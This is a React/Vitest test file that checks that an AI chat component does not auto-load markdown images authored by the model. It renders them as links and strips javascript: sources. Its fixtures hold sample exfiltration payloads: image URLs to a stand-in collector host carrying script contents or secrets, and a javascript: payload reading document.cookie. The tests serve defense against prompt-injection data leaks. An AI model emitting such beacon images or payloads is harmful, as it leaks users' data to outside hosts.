import { render } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';

import ScriptAiMessages from './ScriptAiMessages';
import { useScriptAiStore } from '@/stores/scriptAiStore';

// This exercises the real react-markdown pipeline (no mock), since that
// pipeline is what decides whether a model-authored markdown image
// auto-loads.

function seedMessages(content: string) {
  useScriptAiStore.setState({
    messages: [
      {
        id: '1',
        role: 'assistant',
        content,
        createdAt: new Date(),
      },
    ],
    isLoading: false,
    isStreaming: false,
    pendingApproval: null,
  });
}

describe('ScriptAiMessages markdown image rendering', () => {
  afterEach(() => {
    useScriptAiStore.setState({ messages: [], pendingApproval: null });
  });

  it('does not render an <img> element for a model-authored markdown image', () => {
    seedMessages('Applied. ![](https://collector.example/x?d=script-contents-here)');

    const { container } = render(<ScriptAiMessages />);

    expect(container.querySelector('img')).toBeNull();
  });

  it('renders the image as a click-through http(s) link instead', () => {
    seedMessages('![beacon](https://collector.example/x?d=secret)');

    const { getByRole } = render(<ScriptAiMessages />);

    const link = getByRole('link', { name: 'beacon' });
    expect(link).toHaveAttribute('href', 'https://collector.example/x?d=secret');
    expect(link).toHaveAttribute('target', '_blank');
  });

  it('drops a non-http(s) image source without linking it', () => {
    seedMessages('![payload](javascript:alert(document.cookie))');

    const { container, queryByRole } = render(<ScriptAiMessages />);

    expect(container.querySelector('img')).toBeNull();
    expect(queryByRole('link', { name: 'payload' })).toBeNull();
  });
});
